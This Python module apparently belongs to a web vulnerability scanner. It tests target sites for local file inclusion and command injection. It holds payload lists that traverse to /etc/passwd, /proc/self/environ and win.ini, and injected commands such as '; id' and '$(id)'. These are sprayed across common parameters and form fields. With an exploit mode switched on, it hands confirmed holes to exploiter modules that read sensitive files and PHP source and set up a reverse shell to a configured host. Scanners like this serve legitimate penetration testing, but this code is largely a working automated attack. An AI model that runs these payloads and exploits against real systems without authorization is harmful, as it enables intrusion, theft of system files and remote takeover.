"""
LFI & 命令注入检测模块 — WebVulnScanner v6.0
Author: 火柴 | GitHub: huocai250

[优化] 集成 LFIExploiter / CMDIExploiter 自动利用
[优化] 统一使用 logging
"""
import logging
from core.logger import C as Colors
log = logging.getLogger("webscan")

import re
from utils.http import extract_forms
from core.scanner import BaseScanner


LFI_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
    "%2e%2e%2fetc%2fpasswd", "%2e%2e%c0%afetc%c0%afpasswd",
    "/etc/passwd", "/proc/self/environ",
    "..\\windows\\win.ini", "..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini", "%2e%2e%5cwindows%5cwin.ini",
]

LFI_PARAMS = ["file", "page", "include", "path", "doc", "document",
              "folder", "root", "pg", "style", "template", "php_path",
              "load", "read", "lang", "locale", "module", "view"]

LFI_SIGS = [
    r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]",
    r"daemon:.*:/usr", r"/bin/bash", r"WINDIR",
    r"HTTP_HOST", r"DOCUMENT_ROOT",
]

CMD_PAYLOADS = [
    "; id", "| id", "& id", "; whoami", "| whoami", "& whoami",
    "; id #", "' ; id #", "\" ; id #", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd",
]

CMD_PARAMS = ["cmd", "exec", "command", "execute", "ping", "query",
              "jump", "code", "reg", "do", "func", "exp", "text",
              "input", "host", "ip", "addr"]

CMD_SIGS = [
    r"uid=\d+\(", r"gid=\d+\(", r"groups=\d+",
    r"root:", r"daemon:", r"total \d+", r"drwxr",
]


class LFIScanner(BaseScanner):
    def run(self):
        _before = self.result.total()
        log.info("LFI & 命令注入检测...")
        r = self.get(self.target)
        if not self._test_lfi_get():
            if r:
                self._test_lfi_forms(r.text)
        if not self._test_cmd_get():
            if r:
                self._test_cmd_forms(r.text)
        self._log_module_done("LFI&命令注入", _before)

    def _test_lfi_get(self) -> bool:
        for param in LFI_PARAMS:
            for payload in LFI_PAYLOADS:
                r = self.get(self.target, params={param: payload})
                if r and self._has_lfi(r.text):
                    log.warning(f"[VULN][LFI] 参数: {param} | {payload[:30]}")
                    exploit_result = ""
                    if self.exploit_mode:
                        exploit_result = self._run_lfi_exploit(
                            self.target, param, "GET", {param: "1"})
                    self.result.add("文件包含", "CRITICAL",
                                    f"[LFI] 参数 '{param}' 存在本地文件包含",
                                    f"Payload: {payload}", url=self.target,
                                    exploit_result=exploit_result)
                    return True
        return False

    def _test_lfi_forms(self, html):
        for form in extract_forms(html):
            action = form["action"] or self.target
            if not action.startswith("http"):
                action = self.build_url(action)
            for param in form["inputs"]:
                for payload in LFI_PAYLOADS[:6]:
                    data = form["inputs"].copy()
                    data[param] = payload
                    r = self._req(form["method"], action, data)
                    if r and self._has_lfi(r.text):
                        log.warning(f"[VULN][LFI] 表单参数: {param}")
                        self.result.add("文件包含", "CRITICAL",
                                        f"[LFI] 表单参数 '{param}'",
                                        f"Payload: {payload}", url=action)
                        return

    def _test_cmd_get(self) -> bool:
        for param in CMD_PARAMS:
            for payload in CMD_PAYLOADS:
                r = self.get(self.target, params={param: payload})
                if r and self._has_cmd(r.text):
                    log.warning(f"[VULN][命令注入] 参数: {param}")
                    exploit_result = ""
                    if self.exploit_mode:
                        exploit_result = self._run_cmd_exploit(
                            self.target, param, "GET", {param: "1"})
                    self.result.add("命令注入", "CRITICAL",
                                    f"[RCE] 参数 '{param}' 存在命令注入",
                                    f"Payload: {payload}", url=self.target,
                                    exploit_result=exploit_result)
                    return True
        return False

    def _test_cmd_forms(self, html):
        for form in extract_forms(html):
            action = form["action"] or self.target
            if not action.startswith("http"):
                action = self.build_url(action)
            for param in form["inputs"]:
                for payload in CMD_PAYLOADS[:4]:
                    data = form["inputs"].copy()
                    data[param] = payload
                    r = self._req(form["method"], action, data)
                    if r and self._has_cmd(r.text):
                        log.warning(f"[VULN][命令注入] 表单参数: {param}")
                        self.result.add("命令注入", "CRITICAL",
                                        f"[RCE] 表单参数 '{param}'", url=action)
                        return

    def _run_lfi_exploit(self, url, param, method, base_params) -> str:
        try:
            from modules.exploit.lfi_exploit import LFIExploiter
            info = LFIExploiter(self).exploit(url, param, method, base_params)
            lines = []
            for fname, content in info.get("files_read", {}).items():
                lines.append(f"读取 {fname}:\n{content[:300]}")
            if info.get("php_source"):
                lines.append(f"PHP源码:\n{info['php_source'][:200]}")
            if info.get("log_poisoning_possible"):
                lines.append("⚠ 可能存在日志投毒 RCE 路径！")
            return "\n".join(lines) or "未能读取到敏感文件"
        except Exception as e:
            return f"利用失败: {e}"

    def _run_cmd_exploit(self, url, param, method, base_params) -> str:
        try:
            from modules.exploit.cmdi_exploit import CMDIExploiter
            exploiter = CMDIExploiter(self)
            # 从 scanner 获取反弹shell配置
            rhost = getattr(self, 'reverse_host', '')
            rport = getattr(self, 'reverse_port', 4444)
            info  = exploiter.exploit(url, param, method, base_params,
                                      rhost, rport)
            lines = [f"OS类型: {info.get('os_type','Unknown')}"]
            sys_info = info.get("system_info", {})
            for k, v in list(sys_info.items())[:5]:
                lines.append(f"{k}: {str(v)[:100]}")
            if info.get("reverse_shell"):
                lines.append(f"\n{info['reverse_shell']}")
            return "\n".join(lines)
        except Exception as e:
            return f"利用失败: {e}"

    def _req(self, method, url, params):
        return (self.post(url, data=params) if method == "POST"
                else self.get(url, params=params))

    def _has_lfi(self, text): return any(re.search(p, text) for p in LFI_SIGS)
    def _has_cmd(self, text): return any(re.search(p, text) for p in CMD_SIGS)
